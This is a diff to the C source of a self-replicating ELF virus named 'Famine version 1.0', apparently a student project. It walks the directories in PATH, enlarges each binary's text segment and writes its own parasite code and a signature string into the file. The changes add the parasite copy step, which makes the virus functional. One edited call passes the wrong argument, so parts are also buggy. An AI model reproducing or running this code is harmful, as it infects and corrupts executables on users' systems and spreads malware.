@@ -33,13 +33,13 @@ struct linux_dirent64 {
 
 static size_t  ft_strlen(const char *s);
 static int get_env_var(char *name, char *content, int content_size);
-static int open_directory(char *path);
+static int open_directory(char *path,unsigned long address_of_main);
 static void    *ft_memmove(void *dst, const void *src, size_t len);
 static bool process_runing(void); //CHANGER L APPELLE DE DIR
-static int do_the_job(char file[],size_t size, char *path);
+static int do_the_job(char file[],size_t size, char *path,unsigned long address_of_main);
 static int             ft_strncmp(const char *s1, const char *s2, size_t n);
-static int infect(char path[],size_t path_length);
-static void new_file(char buf[],size_t size, size_t end_of_text,char *path);
+static int infect(char path[],size_t path_length, unsigned long address_of_main);
+static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main);
 static  void	ft_putnbr(int nb);
 static void		ft_putstr(char *s);
 static int		ft_putchar(int c);
@@ -49,7 +49,7 @@ static int ft_isallnum(char *str);
 static char            *ft_strnstr(char *s1, char *s2, size_t n);
 static int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE 4096
+#define PAGE_SIZE (4096 *2)
 
 # define __syscall0(type,name)          \
 type name(void)                         \
@@ -152,6 +152,8 @@ __syscall3(int, mprotect, void *, addr, size_t, len, int, prot);
 
 unsigned long get_eip(void);
 extern int yeah;
+extern int real_start;
+extern int myend;
 
 
 _start()
@@ -167,7 +169,7 @@ _start()
 
 int do_main(void)
 {
-	//printf("%p\n",get_eip() - ((char *)&yeah - (char *)&do_main));
+	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);
 	pid_t pid;
 	void *start;
 	size_t size;
@@ -204,7 +206,7 @@ int do_main(void)
 			{
 				path_env[i] = '\0';
 				//open_directory(&path[i] - length_path);
-				open_directory(&path_env[i] - length_path);
+				open_directory(&path_env[i] - length_path,address_of_main);
 				//write(1,&path[i] - length_path, length_path);
 				//write(1,"\n",1);
 				path_env[i] = ':';
@@ -213,7 +215,7 @@ int do_main(void)
 			else if (path_env[i] == '\0')
 			{
 				if (length_path)
-					open_directory(&path_env[i] - length_path);
+					open_directory(&path_env[i] - length_path,address_of_main);
 				break ;
 			}
 			i++;
@@ -221,7 +223,7 @@ int do_main(void)
 		}
 		while(i < path_length);
 
-			infect(path_env, 256);
+			infect(path_env, 256, address_of_main);
 			write(1,"content: ",9);
 			write(1,path_env,ft_strlen(path_env));
 		exit (0);
@@ -280,7 +282,7 @@ static int get_env_var(char *name, char *content, int content_size)
 	close(fd);
 	return (content[0] != '\0');
 }
-static int open_directory(char *path)
+static int open_directory(char *path, unsigned long address_of_main)
 {
 	int dd,nread;
 	char buf[128];
@@ -343,7 +345,7 @@ static int open_directory(char *path)
 		char mem[st.st_size];
 		int c = read(fd, mem,st.st_size);
 		//write(1,mem,st.st_size);
-		do_the_job(mem,st.st_size,path_file );
+		do_the_job(mem,st.st_size,path_file ,address_of_main);
 			exit(4);
 	}
 	close(dd);
@@ -487,7 +489,7 @@ static bool process_runing(void)
 	}
 	return (0);
 }
-static int do_the_job(char buff[],size_t size, char *path)
+static int do_the_job(char buff[],size_t size, char *path, unsigned long address_of_main)
 {
 	ft_putstr("debut do_the_job\n");
 	//printf("debut do_the_job\n");
@@ -578,11 +580,11 @@ static int do_the_job(char buff[],size_t size, char *path)
 			sec->sh_size += parasite_size;
 	}
 	header->e_shoff += PAGE_SIZE;
-	new_file(buff,size,end_of_text, path);
+	new_file(buff,size,end_of_text, path,address_of_main);
 	ft_putstr("fim do_the_job\n");
 	return 0;
 }
-static int infect(char path[],size_t path_length)
+static int infect(char path[],size_t path_length, unsigned long address_of_main)
 {
 	size_t i = 0;
 
@@ -593,7 +595,7 @@ static int infect(char path[],size_t path_length)
 		{
 			path[i] = '\0';
 			//open_directory(&path[i] - length_path);
-			open_directory(&path[i] - length_path);
+			open_directory(&path[i] - length_path,address_of_main);
 			//write(1,&path[i] - length_path, length_path);
 			//write(1,"\n",1);
 			path[i] = ':';
@@ -602,7 +604,7 @@ static int infect(char path[],size_t path_length)
 		else if (path[i] == '\0')
 		{
 			if (length_path)
-				open_directory(&path[i] - length_path);
+				open_directory(&path[i] - length_path,open_directory);
 			break ;
 		}
 		i++;
@@ -623,11 +625,16 @@ static char    *only_name(char *line)
 	}
 	return (line);
 }
-static void new_file(char buf[],size_t size, size_t end_of_text,char *path)
+static void new_file(char buf[],size_t size, size_t end_of_text,char *path, unsigned long address_of_main)
 {
 	int fd;
 	char *data;
 	char tmp[125];
+	const char needle[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' ','0','0','0','0','0','0','0','0'};
+	unsigned int parasite_size = (char *)&myend - (char *)&real_start;
+
+
+
 	ft_putstr("new_file debut ");
 
 	for (int i = 0; i< 125;i++)
@@ -650,9 +657,14 @@ static void new_file(char buf[],size_t size, size_t end_of_text,char *path)
 	///write(fd,buff,file->size + PAGE_SIZE);
 
 	write(fd,buf, end_of_text);
-
-	for (int i = 0; i< PAGE_SIZE;i++)
+	write(fd,needle, 62);
+	write(fd,address_of_main,parasite_size);
+	ft_putstr("parazite size :");
+	ft_putnbr(parasite_size);
+	ft_putstr("\n");
+	for (int i = 0; i< PAGE_SIZE - 62-parasite_size;i++)
 		write(fd,"j",1);
+
 	write(fd,buf + end_of_text, size - end_of_text);
 	//ft_memmove(data,file->data, end_of_text);
 	//ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
